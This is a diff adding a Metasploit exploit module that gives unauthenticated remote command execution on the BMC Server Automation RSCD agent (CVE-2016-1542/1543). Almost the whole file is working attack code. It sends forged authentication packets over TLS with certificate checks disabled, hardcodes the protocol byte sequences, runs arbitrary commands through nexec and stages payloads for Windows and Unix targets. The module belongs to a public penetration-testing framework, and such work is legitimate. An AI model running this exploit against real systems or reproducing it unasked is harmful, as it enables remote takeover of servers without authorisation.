@@ -1,0 +1,331 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Exploit::Remote::Tcp
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'BMC Server Automation RSCD Agent NSH Remote ' \
+                           'Command Execution',
+      'Description'     => %q(
+        This module exploits a weak access control check in the BMC Server
+        Automation RSCD agent that allows arbitrary operating system commands
+        to be executed without authentication.
+        Note: Under Windows, non-powershell commands may need to be prefixed
+              with 'cmd /c'.
+      ),
+      'Author'          =>
+        [
+          'Olga Yanushkevich, ERNW <@yaole0>', # Vulnerability discovery
+          'Nicky Bloor (@NickstaDB) <nick@nickbloor.co.uk>' # RCE payload and Metasploit module
+        ],
+      'References'      =>
+        [
+          ['URL', 'https://insinuator.net/2016/03/bmc-bladelogic-cve-2016-1542-and-cve-2016-1543/'],
+          ['URL', 'https://nickbloor.co.uk/2018/01/01/rce-with-bmc-server-automation/'],
+          ['URL', 'https://nickbloor.co.uk/2018/01/08/improving-the-bmc-rscd-rce-exploit/'],
+          ['CVE', '2016-1542'],
+          ['CVE', '2016-1543']
+        ],
+      'DisclosureDate'  => 'Mar 16 2016',
+      'Privileged'      => false,
+      'Stance'          => Msf::Exploit::Stance::Aggressive,
+      'Platform'        => %w[win linux unix],
+      'Targets'         =>
+        [
+          ['Automatic', {}],
+          [
+            'Windows/VBS Stager', {
+              'Platform' => 'win',
+              'Payload' => { 'Space' => 8100 }
+            }
+          ],
+          [
+            'Unix/Linux', {
+              'Platform' => %w[linux unix],
+              'Payload' => { 'Space' => 32_700 }
+            }
+          ],
+          [
+            'Generic Command', {
+              'Arch' => ARCH_CMD,
+              'Platform' => %w[linux unix win]
+            }
+          ]
+        ],
+      'DefaultTarget'   => 0,
+      'License'         => MSF_LICENSE,
+      'Payload'         => {
+        'BadChars' => "\x00\x09\x0a"
+      },
+      'CmdStagerFlavor' => %w[vbs echo])
+    )
+
+    register_options(
+      [
+        Opt::RPORT(4750)
+      ]
+    )
+
+    deregister_options('SRVHOST', 'SRVPORT', 'SSL', 'SSLCert', 'URIPATH')
+  end
+
+  def check
+    # Send agentinfo request and check result
+    vprint_status('Checking for BMC with agentinfo request.')
+    res = send_agentinfo_request
+
+    # Check for successful platform detection
+    if res[0] == 1
+      vprint_good('BMC RSCD agent detected, platform appears to be ' + res[1])
+      return CheckCode::Detected
+    end
+
+    # Get first four bytes of the packet which should hold the content length
+    res_len = res[1] && res[1].length > 3 ? res[1][0..3].unpack('N')[0] : 0
+
+    # Return unknown if the packet format appears correct (length field check)
+    if res[1] && res[1].length - 4 == res_len
+      vprint_warning('Target appears to be BMC, however an unexpected ' \
+                     'agentinfo response was returned.')
+      vprint_warning('Response: ' + res[1])
+      return CheckCode::Unknown
+    end
+
+    # Invalid response, probably not a BMC RSCD target
+    vprint_error('The target does not appear to be a BMC RSCD agent.')
+    vprint_error('Response: ' + res[1]) if res[1]
+    CheckCode::Safe
+  end
+
+  def exploit
+    # Do auto target selection
+    target_name = target.name
+
+    if target_name == 'Automatic'
+      # Attempt to detect the target platform
+      vprint_status('Detecting remote platform for auto target selection.')
+      platform = send_agentinfo_request
+
+      # Fail if platform detection was unsuccessful
+      if platform[0].zero?
+        fail_with(Failure::UnexpectedReply, 'Unexpected response while ' \
+                  'detecting target platform.')
+      end
+
+      # Set target based on returned platform
+      target_name = if platform[1].downcase.include?('windows')
+                      'Windows/VBS Stager'
+                    else
+                      'Unix/Linux'
+                    end
+    end
+
+    # Exploit based on target
+    vprint_status('Generating and delivering payload.')
+    if target_name == 'Windows/VBS Stager'
+      if payload.raw.start_with?('powershell', 'cmd')
+        execute_command(payload.raw)
+      else
+        execute_cmdstager(flavor: :vbs, linemax: payload.space)
+      end
+      handler
+    elsif target_name == 'Unix/Linux'
+      execute_cmdstager(flavor: :echo, linemax: payload.space)
+      handler
+    elsif target_name == 'Generic Cmd'
+      send_nexec_request(payload.raw, true)
+    end
+  end
+
+  # Execute a command but don't print output
+  def execute_command(command, opts = {})
+    if opts[:flavor] == :vbs
+      if command.start_with?('powershell') == false
+        if command.start_with?('cmd') == false
+          send_nexec_request('cmd /c ' + command, false)
+          return
+        end
+      end
+    end
+    send_nexec_request(command, false)
+  end
+
+  # Connect to the RSCD agent and execute a command via nexec
+  def send_nexec_request(command, show_output)
+    # Connect and auth
+    vprint_status('Connecting to RSCD agent and sending fake auth.')
+    connect_to_rscd
+    send_fake_nexec_auth
+
+    # Generate and send the payload
+    vprint_status('Sending command to execute.')
+    sock.put(generate_cmd_pkt(command))
+
+    # Finish the nexec request
+    sock.put("\x00\x00\x00\x22\x30\x30\x30\x30\x30\x30\x31\x61\x30\x30\x30" \
+             "\x30\x30\x30\x31\x32\x77\x38\x30\x3b\x34\x31\x3b\x33\x39\x30" \
+             "\x35\x38\x3b\x32\x34\x38\x35\x31")
+    sock.put("\x00\x00\x00\x12\x30\x30\x30\x30\x30\x30\x30\x61\x30\x30\x30" \
+             "\x30\x30\x30\x30\x32\x65\x7f")
+    sock.put("\x00\x00\x00\x12\x30\x30\x30\x30\x30\x30\x30\x61\x30\x30\x30" \
+             "\x30\x30\x30\x30\x32\x69\x03")
+    sock.put("\x00\x00\x00\x12\x30\x30\x30\x30\x30\x30\x30\x61\x30\x30\x30" \
+             "\x30\x30\x30\x30\x32\x74\x31")
+    sock.put("\x00\x00\x00\x1c\x30\x30\x30\x30\x30\x30\x31\x34\x30\x30\x30" \
+             "\x30\x30\x30\x30\x63\x77\x38\x30\x3b\x34\x31\x3b\x38\x30\x3b" \
+             "\x34\x31")
+    sock.put("\x00\x00\x00\x11\x30\x30\x30\x30\x30\x30\x30\x39\x30\x30\x30" \
+             "\x30\x30\x30\x30\x31\x7a")
+
+    # Get the response from the RSCD agent and disconnect
+    vprint_status('Reading response from RSCD agent.')
+    res = read_cmd_output
+    if show_output == true
+      if res && res[0] == 1
+        print_good("Output\n" + res[1])
+      else
+        print_warning('Command execution failed, the command may not exist.')
+        vprint_warning("Output\n" + res[1])
+      end
+    end
+    disconnect
+  end
+
+  # Attempt to retrieve RSCD agent info and return the platform string
+  def send_agentinfo_request
+    # Connect and send fake auth
+    vprint_status('Connecting to RSCD agent and sending fake auth.')
+    connect_to_rscd
+    send_fake_agentinfo_auth
+
+    # Send agentinfo request, read the response, and disconnect
+    vprint_status('Requesting agent information.')
+    sock.put("\x00\x00\x00\x32\x30\x30\x30\x30\x30\x30\x32\x61\x30\x30\x30" \
+             "\x30\x30\x30\x31\x30\x36\x34\x3b\x30\x3b\x32\x3b\x36\x66\x37" \
+             "\x3b\x38\x38\x30\x3b\x30\x30\x30\x30\x30\x30\x30\x30\x32\x34" \
+             "\x31\x30\x30\x30\x30\x30\x30\x30\x30")
+    res = sock.get_once
+    disconnect
+
+    # Return the platform field from the response if it looks valid
+    res_len = res.length > 3 ? res[0..3].unpack('N')[0] : 0
+    return [1, res.split(';')[4]] if res &&
+                                     res.split(';').length > 6 &&
+                                     res.length == (res_len + 4)
+
+    # Invalid or unexpected response format, return the complete response
+    [0, res]
+  end
+
+  # Connect to the target and upgrade to an encrypted connection
+  def connect_to_rscd
+    connect
+    sock.put('TLS')
+    sock.extend(Rex::Socket::SslTcp)
+    sock.sslctx = OpenSSL::SSL::SSLContext.new(:SSLv23)
+    sock.sslctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
+    sock.sslctx.options = OpenSSL::SSL::OP_ALL
+    sock.sslctx.ciphers = 'ALL'
+    sock.sslsock = OpenSSL::SSL::SSLSocket.new(sock, sock.sslctx)
+    sock.sslsock.connect
+  end
+
+  # Send fake agentinfo auth packet and ignore the response
+  def send_fake_agentinfo_auth
+    sock.put("\x00\x00\x00\x5e\x30\x30\x30\x30\x30\x30\x35\x36\x30\x30\x30" \
+             "\x30\x30\x30\x31\x31\x36\x35\x3b\x30\x3b\x33\x35\x3b\x38\x38" \
+             "\x30\x3b\x38\x38\x30\x3b\x30\x30\x30\x30\x30\x30\x30\x33\x35" \
+             "\x30\x3b\x30\x3b\x37\x3b" + rand_text_alpha(7) + "\x3b\x39" \
+             "\x3b\x61\x67\x65\x6e\x74\x69\x6e\x66\x6f\x3b\x2d\x3b\x2d\x3b" \
+             "\x30\x3b\x2d\x3b\x31\x3b\x31\x3b\x37\x3b" + rand_text_alpha(7) +
+             "\x3b\x55\x54\x46\x2d\x38")
+    sock.get_once
+  end
+
+  # Send fake nexec auth packet and ignore the  response
+  def send_fake_nexec_auth
+    sock.put("\x00\x00\x00\x5a\x30\x30\x30\x30\x30\x30\x35\x32\x30\x30\x30" \
+             "\x30\x30\x30\x31\x31\x36\x35\x3b\x30\x3b\x33\x31\x3b\x64\x61" \
+             "\x34\x3b\x64\x61\x34\x3b\x30\x30\x30\x30\x30\x30\x30\x33\x31" \
+             "\x30\x3b\x30\x3b\x37\x3b" + rand_text_alpha(7) + "\x3b\x35" \
+             "\x3b\x6e\x65\x78\x65\x63\x3b\x2d\x3b\x2d\x3b\x30\x3b\x2d\x3b" \
+             "\x31\x3b\x31\x3b\x37\x3b" + rand_text_alpha(7) + "\x3b\x55" \
+             "\x54\x46\x2d\x38")
+    sock.get_once
+  end
+
+  # Generate a payload packet
+  def generate_cmd_pkt(command)
+    # Encode back slashes
+    pkt = command.gsub('\\', "\xc1\xdc")
+
+    # Encode double quotes unless powershell is being used
+    pkt = pkt.gsub('"', "\xc2\x68") unless pkt.start_with?('powershell')
+
+    # Construct the body of the payload packet
+    pkt = pad_number(pkt.length + 32) + "\x30\x30\x30\x30\x30\x30\x31\x30" \
+          "\x62\x37\x3b\x30\x3b\x32\x3b\x63\x61\x65\x3b\x64\x61\x34\x3b\x30" +
+          pad_number(pkt.length) + pkt
+
+    # Prefix with the packet length and return
+    [pkt.length].pack('N') + pkt
+  end
+
+  # Convert the given number to a hex string padded to 8 chars
+  def pad_number(num)
+    format('%08x', num)
+  end
+
+  # Read the command output from the server
+  def read_cmd_output
+    all_output = ''
+    response_done = false
+
+    # Read the entire response from the RSCD service
+    while response_done == false
+      # Read a response chunk
+      chunk = sock.get_once
+      next unless chunk && chunk.length > 4
+      chunk_len = chunk[0..3].unpack('N')[0]
+      chunk = chunk[4..chunk.length]
+      chunk += sock.get_once while chunk.length < chunk_len
+
+      # Check for the "end of output" chunk
+      if chunk_len == 18 && chunk.start_with?("\x30\x30\x30\x30\x30\x30\x30" \
+                                              "\x61\x30\x30\x30\x30\x30\x30" \
+                                              "\x30\x32\x78")
+        # Response has completed
+        response_done = true
+      elsif all_output == ''
+        # Keep the first response chunk as-is
+        all_output += chunk
+
+        # If the command failed, we're done
+        response_done = true unless all_output[8..15].to_i(16) != 1
+      else
+        # Append everything but the length fields to the output buffer
+        all_output += chunk[17..chunk.length]
+      end
+    end
+
+    # Return output if response indicated success
+    return [1, all_output[26..all_output.length]] if
+            all_output &&
+            all_output.length > 26 &&
+            all_output[8..15].to_i(16) == 1
+
+    # Return nothing if there isn't enough data for error output
+    return [0, ''] unless all_output && all_output.length > 17
+
+    # Get the length of the error output and return the error
+    err_len = all_output[8..15].to_i(16) - 1
+    [0, all_output[17..17 + err_len]]
+  end
+end
